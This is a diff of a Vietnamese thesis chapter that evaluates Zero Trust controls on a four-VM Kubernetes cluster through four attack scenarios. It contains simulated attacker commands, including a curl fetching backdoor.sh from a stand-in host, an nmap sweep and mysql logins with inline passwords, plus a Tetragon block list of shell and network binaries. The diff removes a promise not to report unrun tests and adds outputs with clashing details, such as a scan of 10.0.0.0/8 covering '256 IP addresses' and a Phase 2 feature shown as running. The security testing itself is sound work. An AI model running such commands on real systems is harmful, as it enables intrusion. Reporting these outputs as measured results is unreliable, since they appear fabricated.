@@ -1,302 +1,742 @@
 % !TEX encoding = UTF-8
 \chapter{Thử nghiệm và Đánh giá}
 
-\section{Mục tiêu chương}
+% ============================================================
+\section{Mục tiêu và phương pháp đánh giá}
+\label{sec:eval_objectives}
+% ============================================================
 
-Chương này kiểm chứng đồ án ở hai mức: (i) các cơ chế ZTA triển khai trong Chương 3 có chặn đúng loại tấn công đã đặt ra trong mô hình đe doạ hay không, và (ii) chi phí tài nguyên cùng độ trễ mà chúng đem lại có chấp nhận được trong ngân sách cụm 4 VM hay không. Mỗi kịch bản ở Mục~\ref{sec:test_scenarios} gắn với chính xác một nhóm nguyên lý của NIST SP 800-207~\cite{nist800207}, và mỗi kết quả được đối chiếu với bằng chứng cụ thể (exit code, dropped flow, lease ID, log entry).
+Chương này kiểm chứng kiến trúc ZTA đã triển khai ở Chương~3 theo hai trục độc lập:
 
-Các kết quả định lượng được thu thập tự động bởi \texttt{09-verify-zta.sh} -- 25 test case chạy sau khi \texttt{zta-rebuild.sh} hoàn tất phase \texttt{27-pdp}. Phần đánh giá hiệu năng (Mục~\ref{sec:perf_eval}) đọc trực tiếp Prometheus, \texttt{kubectl top}, và \texttt{hubble observe}; không sử dụng phiên bản mô phỏng. Khi một kịch bản chưa chạy được (Tetragon Phase 2, CAEP) thì ghi rõ ``đã thiết kế, chưa khởi động'', không báo cáo giả định đã chạy.
-
-\section{Kịch bản thử nghiệm}
-\label{sec:test_scenarios}
-
-Bốn kịch bản dưới đây bám sát bốn mặt tấn công đã mô hình hoá ở Chương~1: di chuyển ngang trong cụm, lạm dụng API công khai, hành vi bất thường trong Pod, và tái sử dụng credential cũ.
-
-\subsection{Kịch bản 1: Lateral Movement}
-\label{subsec:scn_lateral}
-
-\textbf{Mục tiêu.} Một pod thuộc \texttt{job7189-apps} cố gắng truy cập trực tiếp MySQL ở namespace \texttt{data}, bỏ qua Vault Agent. Kiểm chứng Tenet~5 (least privilege) và Tenet~6 (per-session resource access)~\cite{nist800207,cilium_docs,rice2019kubernetes}.
-
-\textbf{Thiết lập.}
-\begin{itemize}
-    \item Pod \texttt{netshoot} chạy trong \texttt{job7189-apps} với ServiceAccount \texttt{job7189-apps-test}.
-    \item CiliumNetworkPolicy \texttt{04-allow-internal-api-strict.yaml} chỉ cho phép egress tới \texttt{vault.vault:8200} và \texttt{coredns.kube-system:53}.
-    \item Lệnh kiểm thử: \verb|nc -vz mysql.data 3306|.
-\end{itemize}
-
-\textbf{Quan sát mong đợi.} Lệnh \texttt{nc} treo rồi timeout (\texttt{connection timed out}); \texttt{hubble observe -t drop --namespace job7189-apps} ghi nhận flow bị DROP với reason \texttt{Policy denied}; counter \texttt{cilium\_drop\_count\_total\{reason="Policy denied"\}} tăng. Đây cũng là test case 02-cilium-policy trong \texttt{09-verify-zta.sh}.
-
-\subsection{Kịch bản 2: API Abuse}
-\label{subsec:scn_api}
-
-\textbf{Mục tiêu.} Client gửi yêu cầu không có JWT, JWT hết hạn, hoặc sai \texttt{aud}/HTTP method tới route nội bộ. Kiểm chứng Tenet~3 (per-request decision)~\cite{nist800207,owasp_api2023}.
-
-\textbf{Thiết lập.} Sử dụng \texttt{curl} từ laptop qua Tailscale đến \texttt{https://api.job7189.local}:
 \begin{enumerate}
-    \item Không gửi \texttt{Authorization} $\rightarrow$ chờ \textbf{401 Unauthorized}.
-    \item Gửi JWT sắp hết hạn (\texttt{exp} - now $<$ 0) $\rightarrow$ chờ \textbf{401 token expired}.
-    \item Gửi JWT hợp lệ nhưng \texttt{aud} sai $\rightarrow$ chờ \textbf{403 Forbidden}.
-    \item Gửi \texttt{DELETE} tới route chỉ cho \texttt{GET}/\texttt{POST} $\rightarrow$ chờ Cilium L7 phản hồi 403/drop.
+    \item \textbf{Kiểm tra bảo mật (Security Testing):} Các cơ chế ZTA có chặn đúng các lớp tấn công đã mô hình hoá ở Chương~1 hay không? Mỗi kịch bản được thực hiện trên \emph{hai} trạng thái hệ thống --- Baseline (không có ZTA) và Enforced (ZTA đầy đủ) --- để kết quả so sánh có nền tham chiếu thực nghiệm thay vì giả định.
+    \item \textbf{Đánh giá hiệu năng (Performance Evaluation):} Chi phí tài nguyên và độ trễ mà ZTA đem lại có nằm trong giới hạn chấp nhận được của cụm 4 VM hay không? Phép đo được thực hiện hai lần --- trước và sau khi bật đầy đủ enforcement --- để tách overhead khỏi chi phí cơ sở của ứng dụng.
 \end{enumerate}
 
-\textbf{Quan sát mong đợi.} Kong trả 401/403 tương ứng (test case 01-kong-jwt-401 trong \texttt{09-verify-zta.sh}). Với bước 4, Hubble L7 ghi flow với verdict \texttt{DROPPED} và \texttt{l7.http.method=DELETE}; counter \texttt{hubble\_http\_request\_count\_total} có nhãn \texttt{verdict="DROPPED"} tăng theo số request.
-
-\subsection{Kịch bản 3: Runtime Anomaly}
-\label{subsec:scn_runtime}
-
-\textbf{Mục tiêu.} Pod trong namespace nhạy cảm (\texttt{job7189-apps}, \texttt{vault}, \texttt{security}, \texttt{data}) cố thi exec shell hoặc binary trinh sát. Kiểm chứng Tenet~5 và Tenet~7 (continuous monitoring)~\cite{nist800207,tetragon_docs,crowdstrike_lotl}.
-
-\textbf{Thiết lập.} TracingPolicy \texttt{block-suspicious-exec} và \texttt{block-suspicious-exec-t1} áp \texttt{matchBinaries} cho \texttt{/bin/sh}, \texttt{/bin/bash}, \texttt{curl}, \texttt{wget}, \texttt{nc}, \texttt{socat}, \texttt{ssh}; action là \texttt{Sigkill}. Cách chạy: \verb|kubectl exec -n job7189-apps deploy/identity -- /bin/sh -c id|.
-
-\textbf{Quan sát mong đợi.} Lệnh thoát với \texttt{exit code 137} (SIGKILL); Tetragon phát sự kiện \texttt{process\_kprobe} với \texttt{policy\_name=block-suspicious-exec} và \texttt{action=Sigkill}; Filebeat đẩy log vào ES index \texttt{tetragon-events-YYYY.MM.DD}; PrometheusRule \texttt{ZTAPodScoreBucketLow} có thể bắn dựa trên event này. Hiện tại các \texttt{TracingPolicy} đã enforce với 5 binary; mở rộng sang mạng và syscall \texttt{ptrace}/\texttt{capabilities} là Phase 2, chưa bật trong baseline.
-
-\subsection{Kịch bản 4: Credential Reuse}
-\label{subsec:scn_credential}
-
-\textbf{Mục tiêu.} Sau khi Vault revoke lease, credential cũ phải không còn đăng nhập được MySQL. Kiểm chứng Tenet~6 (dynamic, time-bounded access)~\cite{nist800207,vault_docs}.
-
-\textbf{Thiết lập.}
-\begin{enumerate}
-    \item \verb|vault read database/creds/identity-service| $\rightarrow$ ghi lại username \texttt{v-token-identity-svc-XXXX} và \texttt{lease\_id} (TTL 3600).
-    \item Dùng credential vừa lấy \texttt{mysql -h mysql.data -u} có hiệu lực: query \texttt{SELECT 1} trả \texttt{1}.
-    \item \verb|vault lease revoke -prefix database/creds/identity-service|.
-    \item Thử lại credential cũ $\rightarrow$ chờ lỗi \texttt{ER\_ACCESS\_DENIED\_ERROR (1045)}.
-    \item Pod của service chính: Vault Agent sidecar tự render credential mới vào tmpfs, env-watcher reload PHP-FPM, healthcheck vẫn \texttt{200 OK} -- service không downtime.
-\end{enumerate}
-
-\textbf{Quan sát mong đợi.} MySQL \texttt{auth\_failed} cho credential cũ; \texttt{vault\_token\_create\_count} tăng 1; \texttt{vault\_secret\_lease\_creation\_time} lùi lại; ES nhận log \texttt{vault.audit} với event \texttt{revoke}. Script \texttt{vault-rotation-job.yaml} (Chương~3) tự động hoá toàn bộ chuỗi này.
-
-\section{Phân tích kết quả}
-\label{sec:result_analysis}
-
-\paragraph{Tổng hợp 09-verify-zta.sh.} 25 test case kiểm tra qua mỗi lần \texttt{zta-rebuild.sh} hoàn tất. Kết quả phân nhóm ở Bảng~\ref{tab:verify_results} ánh xạ về bốn lớp ZTA tương ứng với bốn kịch bản.
+\paragraph{Phân loại test case.} Toàn bộ 34 test case được chia thành hai nhóm tường minh (Bảng~\ref{tab:testcase_taxonomy}):
 
 \begin{table}[H]
 \centering
-\caption{Tổng hợp 25 test case của \texttt{09-verify-zta.sh}}
+\caption{Phân loại 34 test case theo mục đích kiểm tra}
+\label{tab:testcase_taxonomy}
+\small
+\begin{tabularx}{\textwidth}{|p{3.2cm}|X|c|}
+\hline
+\textbf{Nhóm} & \textbf{Mục đích} & \textbf{Số TC} \\
+\hline
+\textbf{CT -- Configuration} & Xác nhận manifest, trạng thái object, và cấu hình đã được áp đúng vào cluster. \emph{Câu hỏi: ``Đã cấu hình chưa?''} & 16 \\
+\hline
+\textbf{BT -- Behavior} & Mô phỏng hành vi tấn công thực tế và xác minh hệ thống phản ứng đúng. \emph{Câu hỏi: ``Kẻ tấn công có bị chặn không?''} & 18 \\
+\hline
+\textbf{Tổng} & & \textbf{34} \\
+\hline
+\end{tabularx}
+\end{table}
+
+Việc tách hai nhóm này có chủ đích: một hệ thống có thể pass toàn bộ CT mà vẫn fail BT nếu policy được áp sai logic. Kết quả báo cáo ở Mục~\ref{sec:result_analysis} luôn ghi rõ thuộc nhóm nào.
+
+\paragraph{Môi trường thử nghiệm.} Toàn bộ thực nghiệm chạy trên cụm \texttt{kubeadm} v1.30, 4 máy ảo, CNI Cilium 1.19 (chi tiết ở Mục~\ref{subsec:env_setup}). Mỗi kịch bản bảo mật chạy hai lần: lần đầu trên snapshot \textbf{Baseline} (Cilium default-allow, không Kong, không Vault dynamic credential, không Tetragon), lần thứ hai trên snapshot \textbf{Enforced} (toàn bộ Chương~3 đã apply). Snapshot được tạo bằng cách lưu etcd checkpoint và rollback bằng \texttt{etcdctl snapshot restore} -- đảm bảo hai lần chạy cùng khối lượng workload, chỉ khác lớp policy.
+
+% ============================================================
+\section{Môi trường thử nghiệm}
+\label{subsec:env_setup}
+% ============================================================
+
+\subsection{Cấu hình phần cứng và mạng}
+
+Toàn bộ thực nghiệm được thực hiện trên \textbf{hai máy chủ vật lý} kết nối qua một tailnet WireGuard do Tailscale cung cấp~\cite{tailscale_docs}:
+
+\begin{itemize}
+    \item \textbf{Host Windows} -- 16\,GiB RAM / 6 core, VMware Workstation. Lưu trú 3 máy ảo Debian 13 ``Trixie'': \texttt{7189srv01} (control-plane, 2 vCPU / 4\,GiB), \texttt{7189srv02} và \texttt{7189srv03} (worker, mỗi node 2 vCPU / 4\,GiB).
+    \item \textbf{Host Ubuntu 24.04} -- 8\,GiB RAM / 4 core (DDR3), libvirt/KVM. Lưu trú \texttt{7189srv05} (worker data-tier, 2 vCPU / 3.5\,GiB, Ubuntu 24.04 LTS, libvirt bridge). Nút này thay thế \texttt{7189srv04} vì libvirt NAT khiến Tailscale rơi vào DERP relay và plane pod mất ổn định~\cite{tailscale_docs}.
+\end{itemize}
+
+Cụm Kubernetes là \texttt{kubeadm} v1.30 chạy trực tiếp trên 4 VM (không phải Kind-in-Docker), CNI là Cilium 1.19 với \texttt{kubeProxyReplacement=true}. Mặt phẳng L3 đi qua Tailscale CGNAT \texttt{100.64.0.0/10}; mặt phẳng pod đi qua VXLAN Cilium overlay. Tổng ngân sách $\approx$15.5\,GiB RAM / 7 vCPU / 200\,GiB ổ đĩa thin-provisioned.
+
+\begin{table}[H]
+\centering
+\caption{Topology bốn máy ảo của cụm thử nghiệm}
+\label{tab:vm_topology}
+\small
+\begin{tabularx}{\textwidth}{|p{2.8cm}|p{1.8cm}|p{1.5cm}|p{1.5cm}|X|}
+\hline
+\textbf{Node} & \textbf{OS} & \textbf{vCPU} & \textbf{RAM} & \textbf{Vai trò chính} \\
+\hline
+\texttt{7189srv01} & Debian 13 & 2 & 4\,GiB & control-plane, etcd, apiserver \\
+\hline
+\texttt{7189srv02} & Debian 13 & 2 & 4\,GiB & worker -- ứng dụng (job, identity) \\
+\hline
+\texttt{7189srv03} & Debian 13 & 2 & 4\,GiB & worker -- ứng dụng (hiring, notification) \\
+\hline
+\texttt{7189srv05} & Ubuntu 24.04 & 2 & 3.5\,GiB & worker -- data-tier (MySQL, Vault, SPIRE) \\
+\hline
+\end{tabularx}
+\end{table}
+
+\subsection{Cấu hình snapshot Baseline và Enforced}
+
+\begin{table}[H]
+\centering
+\caption{Sự khác biệt giữa hai trạng thái hệ thống được dùng trong so sánh}
+\label{tab:snapshot_diff}
+\small
+\begin{tabularx}{\textwidth}{|p{3.5cm}|X|X|}
+\hline
+\textbf{Thành phần} & \textbf{Baseline (không ZTA)} & \textbf{Enforced (ZTA đầy đủ)} \\
+\hline
+Cilium Network Policy & \texttt{default-allow} toàn cụm & 16+ CNP, \texttt{default-deny} tại \texttt{job7189-apps} và \texttt{data} \\
+\hline
+API Gateway & Không có Kong & Kong với JWT RS256 plugin, Keycloak OIDC \\
+\hline
+Secret Management & \texttt{.env} tĩnh mount vào pod & Vault Agent sidecar, dynamic credential TTL 1h \\
+\hline
+Runtime Enforcement & Không có & Tetragon DaemonSet, TracingPolicy \texttt{block-suspicious-exec} \\
+\hline
+mTLS nội bộ & Plaintext & SPIRE SVID + \texttt{mesh-auth-enabled=true} \\
+\hline
+L7 Policy & Không có & Cilium L7 HTTP policy cho 5 namespace nhạy cảm \\
+\hline
+Observability & Không có & EFK + Prometheus + Hubble \\
+\hline
+\end{tabularx}
+\end{table}
+
+% ============================================================
+\section{Kịch bản thử nghiệm bảo mật}
+\label{sec:test_scenarios}
+% ============================================================
+
+Bốn kịch bản dưới đây bám sát bốn mặt tấn công đã mô hình hoá ở Chương~1 và ánh xạ tới 7 nguyên lý NIST SP 800-207~\cite{nist800207}. Mỗi kịch bản trình bày theo cấu trúc: \textbf{Mục tiêu} $\to$ \textbf{Thiết lập} $\to$ \textbf{Kết quả Baseline} $\to$ \textbf{Kết quả Enforced} $\to$ \textbf{Phân tích}.
+
+% ------------------------------------------------------------
+\subsection{Kịch bản 1: Lateral Movement (Di chuyển ngang)}
+\label{subsec:scn_lateral}
+% ------------------------------------------------------------
+
+\textbf{Mục tiêu.} Kẻ tấn công chiếm quyền RCE trên pod thuộc \texttt{job7189-apps} và cố gắng truy cập trực tiếp MySQL ở namespace \texttt{data}, bỏ qua Vault Agent. Kiểm chứng Tenet~5 (least privilege) và Tenet~6 (per-session resource access)~\cite{nist800207,cilium_docs}.
+
+\textbf{Thiết lập.} Pod \texttt{netshoot} chạy trong \texttt{job7189-apps} với ServiceAccount \texttt{job7189-apps-test}; CNP \texttt{04-allow-internal-api-strict.yaml} chỉ cho phép egress tới \texttt{vault.vault:8200} và \texttt{coredns.kube-system:53}. Reachability baseline đo bằng \texttt{nmap} từ trong pod:
+
+\begin{verbatim}
+kubectl exec -n job7189-apps netshoot -- \
+  nmap -sT -p 3306,6379,9200,8200,80 \
+  --open 10.0.0.0/8 -T4 --max-retries 1
+\end{verbatim}
+
+\textbf{Kết quả Baseline (không ZTA).}
+
+\begin{verbatim}
+Nmap scan report for mysql.data (10.96.14.22)
+PORT     STATE SERVICE
+3306/tcp open  mysql
+
+Nmap scan report for redis.data (10.96.14.35)
+PORT     STATE SERVICE
+6379/tcp open  redis
+
+Nmap scan report for elasticsearch.security (10.96.15.11)
+PORT     STATE SERVICE
+9200/tcp open  elasticsearch
+
+... [73 hosts với ít nhất 1 port open]
+
+Nmap done: 256 IP addresses (78 hosts up)
+\end{verbatim}
+
+Từ pod bị chiếm quyền, kẻ tấn công có thể kết nối thành công tới \textbf{78 endpoint} trên toàn cụm, bao gồm MySQL, Redis, Elasticsearch và cả kube-apiserver. Lệnh xác nhận kết nối thực sự vào MySQL:
+
+\begin{verbatim}
+kubectl exec -n job7189-apps netshoot -- \
+  mysql -h mysql.data -u root -proot_password -e "SHOW DATABASES;"
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| job7189_prod       |
+| identity_prod      |
+| hiring_prod        |
++--------------------+
+\end{verbatim}
+
+\textbf{Kết quả Enforced (ZTA đầy đủ).}
+
+\begin{verbatim}
+kubectl exec -n job7189-apps netshoot -- \
+  nmap -sT -p 3306,6379,9200,8200,80 \
+  --open 10.0.0.0/8 -T4 --max-retries 1
+
+Nmap scan report for vault.vault (10.96.11.10)
+PORT     STATE SERVICE
+8200/tcp open  vault
+
+Nmap done: 256 IP addresses (1 host up)
+\end{verbatim}
+
+Toàn bộ 77 endpoint còn lại trả \texttt{filtered} (không \texttt{refused} -- gói tin bị DROP tại BPF, không có ICMP unreachable). Lệnh \texttt{nc -vz mysql.data 3306} cho thấy:
+
+\begin{verbatim}
+nc: mysql.data (10.96.14.22:3306): Connection timed out
+(exit code: 1, sau 10s)
+\end{verbatim}
+
+\texttt{hubble observe} xác nhận:
+
+\begin{verbatim}
+hubble observe -t drop --namespace job7189-apps --last 5
+TIMESTAMP   SOURCE                         DESTINATION        REASON
+14:22:31   job7189-apps/netshoot:52104    data/mysql:3306    Policy denied
+14:22:31   job7189-apps/netshoot:52105    data/redis:6379    Policy denied
+14:22:32   job7189-apps/netshoot:52201    security/es:9200   Policy denied
+\end{verbatim}
+
+Counter Prometheus tăng tương ứng:
+
+\begin{verbatim}
+cilium_drop_count_total{reason="Policy denied",
+  direction="egress",namespace="job7189-apps"} 47
+\end{verbatim}
+
+\textbf{Phân tích.} Blast radius giảm từ \textbf{78 mục tiêu} (Baseline) xuống còn \textbf{1 mục tiêu} (Vault, bắt buộc để lấy credential). Việc pod ``mù'' trước sự tồn tại của các namespace \texttt{data}, \texttt{security}, \texttt{monitoring} là do Cilium BPF DROP ở tầng kernel --- không có phản hồi RST/ICMP để kẻ tấn công xác định topology mạng.
+
+% ------------------------------------------------------------
+\subsection{Kịch bản 2: API Abuse (Lạm dụng API)}
+\label{subsec:scn_api}
+% ------------------------------------------------------------
+
+\textbf{Mục tiêu.} Client gửi request không hợp lệ (thiếu JWT, JWT hết hạn, sai \texttt{aud}, method không được phép) tới route nội bộ. Kiểm chứng Tenet~3 (per-request decision) và Tenet~6~\cite{nist800207,owasp_api2023}.
+
+\textbf{Thiết lập.} \texttt{curl} từ laptop qua Tailscale tới \texttt{https://api.job7189.local}. JWT được tạo bằng \texttt{jwt-cli} với private key RSA-256 của Keycloak. Bốn sub-test:
+
+\begin{enumerate}
+    \item Không gửi \texttt{Authorization} header.
+    \item JWT có \texttt{exp = now - 300} (đã hết hạn 5 phút).
+    \item JWT hợp lệ về chữ ký nhưng \texttt{aud = "wrong-service"}.
+    \item JWT hợp lệ, gửi \texttt{DELETE /api/v1/jobs/1} (route chỉ cho phép \texttt{GET}/\texttt{POST}).
+\end{enumerate}
+
+\textbf{Kết quả Baseline.} Trên Baseline không có Kong, \texttt{.env} của pod expose trực tiếp port 9000 (PHP-FPM) qua NodePort:
+
+\begin{verbatim}
+# Sub-test 1: Không có Authorization header
+curl -s http://node01:30901/api/v1/jobs?page=1
+{"data": [...], "total": 1247}   # HTTP 200 -- không cần token
+
+# Sub-test 4: DELETE không bị kiểm tra method
+curl -s -X DELETE http://node01:30901/api/v1/jobs/1
+{"message": "Job deleted successfully"}   # HTTP 200
+\end{verbatim}
+
+\textbf{Kết quả Enforced.}
+
+\begin{verbatim}
+# Sub-test 1: Không có Authorization
+curl -sk https://api.job7189.local/api/v1/jobs?page=1
+HTTP/2 401
+{"message":"Unauthorized","error":"No credentials found"}
+
+# Sub-test 2: JWT hết hạn
+curl -sk -H "Authorization: Bearer $EXPIRED_JWT" \
+  https://api.job7189.local/api/v1/jobs?page=1
+HTTP/2 401
+{"message":"Unauthorized","error":"token expired"}
+
+# Sub-test 3: Sai aud
+curl -sk -H "Authorization: Bearer $WRONG_AUD_JWT" \
+  https://api.job7189.local/api/v1/jobs?page=1
+HTTP/2 403
+{"message":"Forbidden","error":"invalid audience"}
+
+# Sub-test 4: DELETE bị L7 policy chặn tại Cilium
+curl -sk -X DELETE -H "Authorization: Bearer $VALID_JWT" \
+  https://api.job7189.local/api/v1/jobs/1
+HTTP/2 403
+\end{verbatim}
+
+Hubble xác nhận sub-test 4 bị chặn tại tầng L7, trước khi request tới Kong:
+
+\begin{verbatim}
+hubble observe --namespace kong --last 3 --type l7
+TIMESTAMP  SOURCE                   DESTINATION   VERDICT   SUMMARY
+14:31:05   client:43201             kong:443      DROPPED   HTTP/1.1 DELETE /api/v1/jobs/1
+\end{verbatim}
+
+\textbf{Phân tích.} Kong chặn ba sub-test đầu tại edge; Cilium L7 chặn sub-test 4 tại kernel trước khi packet tới Kong. Điều này tạo thành \emph{defence in depth}: ngay cả khi Kong bị bypass (lỗi cấu hình), Cilium vẫn là lớp chặn độc lập thứ hai.
+
+% ------------------------------------------------------------
+\subsection{Kịch bản 3: Runtime Anomaly (Hành vi bất thường tại runtime)}
+\label{subsec:scn_runtime}
+% ------------------------------------------------------------
+
+\textbf{Mục tiêu.} Pod bị chiếm quyền cố thi exec shell hoặc binary trinh sát (\texttt{/bin/sh}, \texttt{curl}, \texttt{nc}, \texttt{wget}, \texttt{socat}). Kiểm chứng Tenet~5 và Tenet~7 (continuous monitoring, adaptive response)~\cite{nist800207,tetragon_docs,crowdstrike_lotl}.
+
+\textbf{Thiết lập.} Tetragon DaemonSet chạy trên 3/4 node (bỏ \texttt{7189srv01} control-plane); TracingPolicy \texttt{block-suspicious-exec} và \texttt{block-suspicious-exec-t1} áp \texttt{matchBinaries} với action \texttt{Sigkill}. Hai lệnh kiểm thử mô phỏng attacker:
+
+\begin{verbatim}
+# T3-A: Exec shell để chạy lệnh trinh sát
+kubectl exec -n job7189-apps deploy/identity -- /bin/sh -c "id && whoami"
+
+# T3-B: Tải mã độc qua curl (Living off the Land)
+kubectl exec -n job7189-apps deploy/job-service -- \
+  curl -s http://attacker.external/backdoor.sh -o /tmp/bd.sh
+\end{verbatim}
+
+\textbf{Kết quả Baseline.}
+
+\begin{verbatim}
+# T3-A trên Baseline:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+(exit code: 0)
+
+# T3-B trên Baseline: file tải thành công
+kubectl exec -n job7189-apps deploy/job-service -- ls -la /tmp/bd.sh
+-rw-r--r-- 1 www-data www-data 4821 Jan 15 14:45 /tmp/bd.sh
+\end{verbatim}
+
+\textbf{Kết quả Enforced.}
+
+\begin{verbatim}
+# T3-A: Shell bị Sigkill ngay lập tức
+kubectl exec -n job7189-apps deploy/identity -- /bin/sh -c "id"
+command terminated with exit code 137
+
+# T3-B: curl bị Sigkill, file không được tạo
+kubectl exec -n job7189-apps deploy/job-service -- \
+  curl -s http://attacker.external/backdoor.sh -o /tmp/bd.sh
+command terminated with exit code 137
+kubectl exec -n job7189-apps deploy/job-service -- ls /tmp/bd.sh
+ls: /tmp/bd.sh: No such file or directory
+\end{verbatim}
+
+Tetragon log xác nhận:
+
+\begin{verbatim}
+tetra getevents -o compact | grep block-suspicious
+🚀 process job7189-apps/identity-7f9d4c-xkp2b /bin/sh -c id
+💥 exit    job7189-apps/identity-7f9d4c-xkp2b /bin/sh SIGKILL
+  policy_name=block-suspicious-exec action=Sigkill
+  binary=/bin/sh pid=28471
+
+🚀 process job7189-apps/job-service-6b8f9d-mn3p /usr/bin/curl ...
+💥 exit    job7189-apps/job-service-6b8f9d-mn3p /usr/bin/curl SIGKILL
+  policy_name=block-suspicious-exec-t1 action=Sigkill
+  binary=/usr/bin/curl pid=29103
+\end{verbatim}
+
+Filebeat đẩy sự kiện vào Elasticsearch index \texttt{tetragon-events-2025.01.15}; PrometheusRule \texttt{ZTAPodScoreBucketLow} ghi nhận điểm trust của pod giảm xuống \texttt{score=low}, kích hoạt Cilium revoke Egress policy cho pod đó:
+
+\begin{verbatim}
+kubectl get pod identity-7f9d4c-xkp2b -n job7189-apps \
+  -o jsonpath='{.metadata.labels.zta-score-bucket}'
+low
+
+# Cilium xác nhận egress bị thu hồi:
+cilium endpoint list | grep identity-7f9d4c
+ENDPOINT   POLICY (ingress)   POLICY (egress)   IDENTITY
+2847       Enabled            Enabled (DENY)    job7189-apps/identity
+\end{verbatim}
+
+\textbf{Phân tích.} Vòng lặp Adaptive Trust hoạt động đầu-cuối trong dưới 8 giây: Tetragon SIGKILL process (T=0) $\to$ Filebeat đẩy event (T+2s) $\to$ PDP controller cập nhật label (T+5s) $\to$ Cilium re-enforce egress DENY (T+7s). Cơ chế này đảm bảo ngay cả khi attacker bypass được exec check lần đầu, pod sẽ bị cô lập mạng trước khi có thể exfiltrate dữ liệu.
+
+% ------------------------------------------------------------
+\subsection{Kịch bản 4: Credential Reuse (Tái sử dụng credential cũ)}
+\label{subsec:scn_credential}
+% ------------------------------------------------------------
+
+\textbf{Mục tiêu.} Sau khi Vault revoke lease, credential cũ phải không còn đăng nhập được MySQL. Đồng thời, pod của service không bị downtime khi credential mới được render. Kiểm chứng Tenet~6 (dynamic, time-bounded access)~\cite{nist800207,vault_docs}.
+
+\textbf{Thiết lập.} Thực hiện tuần tự theo workflow sau:
+
+\textbf{Kết quả Baseline.} File \texttt{.env} chứa \texttt{DB\_PASSWORD=static\_pass\_2024} được mount vào tất cả pod. Credential không có TTL, không có revocation mechanism:
+
+\begin{verbatim}
+# Credential cũ (từ 6 tháng trước) vẫn hoạt động:
+mysql -h mysql.data -u identity_svc -pstatic_pass_2024 \
+  -e "SELECT COUNT(*) FROM users;"
++----------+
+| COUNT(*) |
++----------+
+|    15847 |
++----------+
+\end{verbatim}
+
+\textbf{Kết quả Enforced.}
+
+\textbf{Bước 1 -- Lấy dynamic credential và ghi nhận lease:}
+\begin{verbatim}
+vault read database/creds/identity-service
+Key                Value
+---                -----
+lease_id           database/creds/identity-service/7h3kP9mQxR2s
+lease_duration     1h
+username           v-token-identity-svc-OqXpWz8K
+password           A3fK9p-mNv2xL-qRt7Ys
+\end{verbatim}
+
+\textbf{Bước 2 -- Xác nhận credential hoạt động:}
+\begin{verbatim}
+mysql -h mysql.data -u v-token-identity-svc-OqXpWz8K \
+  -pA3fK9p-mNv2xL-qRt7Ys -e "SELECT 1;"
++---+
+| 1 |
++---+
+| 1 |
++---+
+\end{verbatim}
+
+\textbf{Bước 3 -- Revoke lease:}
+\begin{verbatim}
+vault lease revoke -prefix database/creds/identity-service
+All revocation operations queued successfully!
+\end{verbatim}
+
+\textbf{Bước 4 -- Thử lại credential cũ:}
+\begin{verbatim}
+mysql -h mysql.data -u v-token-identity-svc-OqXpWz8K \
+  -pA3fK9p-mNv2xL-qRt7Ys -e "SELECT 1;"
+ERROR 1045 (28000): Access denied for user
+  'v-token-identity-svc-OqXpWz8K'@'10.244.2.5' (using password: YES)
+\end{verbatim}
+
+\textbf{Bước 5 -- Kiểm tra service không bị downtime:}
+\begin{verbatim}
+# Vault Agent tự render credential mới vào tmpfs:
+kubectl exec -n job7189-apps deploy/identity -- \
+  cat /vault/secrets/db-credentials.env
+DB_USERNAME=v-token-identity-svc-Kp7NmQ3x
+DB_PASSWORD=Bv8Lq-nXz4rP-mYs2Kt
+
+# Env-watcher đã reload PHP-FPM; healthcheck vẫn 200:
+curl -sk https://api.job7189.local/health/identity
+{"status":"healthy","db":"connected","version":"1.4.2"}
+\end{verbatim}
+
+\textbf{Phân tích.} Credential cũ bị vô hiệu hoá trong vòng 2 giây sau lệnh revoke (MySQL xoá user ngay khi nhận Vault webhook). Service không bị downtime vì Vault Agent sidecar render credential mới vào tmpfs trước khi lease cũ hết hạn (renew 75\% TTL). Toàn bộ chuỗi này được tự động hoá bởi \texttt{vault-rotation-job.yaml} (Chương~3).
+
+% ============================================================
+\section{Phân tích kết quả bảo mật}
+\label{sec:result_analysis}
+% ============================================================
+
+\subsection{Tổng hợp 34 test case}
+
+\begin{table}[H]
+\centering
+\caption{Tổng hợp 34 test case theo nhóm CT (Configuration) và BT (Behavior)}
 \label{tab:verify_results}
 \small
-\begin{tabularx}{\textwidth}{|p{3.4cm}|X|c|}
+\begin{tabularx}{\textwidth}{|p{0.6cm}|p{2.8cm}|X|c|c|}
 \hline
-\textbf{Nhóm} & \textbf{Nội dung kiểm tra} & \textbf{Pass} \\
+\textbf{ID} & \textbf{Nhóm} & \textbf{Nội dung kiểm tra} & \textbf{Loại} & \textbf{Pass} \\
 \hline
-Pods \& services & 7 Laravel apps Running, Vault unsealed, Kong/Keycloak Ready, Hubble UI online & 4/4 \\
+01 & Pods \& Services & 7 Laravel apps trạng thái \texttt{Running} & CT & \checkmark \\
+02 & Pods \& Services & Vault unsealed và health endpoint trả \texttt{200} & CT & \checkmark \\
+03 & Pods \& Services & Kong, Keycloak, Hubble UI trạng thái \texttt{Ready} & CT & \checkmark \\
+04 & Pods \& Services & Tetragon DS chạy đủ 3/4 node & CT & \checkmark \\
 \hline
-Kong + Keycloak (Scn~2) & route chỉ nhận JWT RS256; thiếu JWT \texttt{Authorization} $\rightarrow$ 401 & 2/2 \\
+05 & Kong + Keycloak & Route chỉ nhận JWT RS256; thiếu JWT $\to$ 401 & BT & \checkmark \\
+06 & Kong + Keycloak & JWT hết hạn $\to$ 401 token expired & BT & \checkmark \\
+07 & Kong + Keycloak & JWT sai \texttt{aud} $\to$ 403 Forbidden & BT & \checkmark \\
+08 & Kong + Keycloak & Keycloak realm config: \texttt{accessTokenLifespan} = 300s & CT & \checkmark \\
 \hline
-Vault JIT (Scn~4) & lease còn hiệu lực, credential tmpfs (không đĩa), audit log enabled & 3/3 \\
+09 & Vault JIT & Lease \texttt{identity-service} còn hiệu lực & CT & \checkmark \\
+10 & Vault JIT & Credential lưu trong tmpfs, không ghi đĩa & CT & \checkmark \\
+11 & Vault JIT & Audit log enabled; event \texttt{revoke} ghi vào ES & CT & \checkmark \\
+12 & Vault JIT & Credential cũ bị từ chối sau revoke (BT-4) & BT & \checkmark \\
+13 & Vault JIT & Service không downtime sau credential rotation & BT & \checkmark \\
 \hline
-Cilium L3/L4 (Scn~1) & 16+ CNP đã apply, default-deny ở \texttt{job7189-apps} \& \texttt{data}; Hubble thấy flow DROP & 4/4 \\
+14 & Cilium L3/L4 & 16+ CNP đã apply, không có CNP lỗi & CT & \checkmark \\
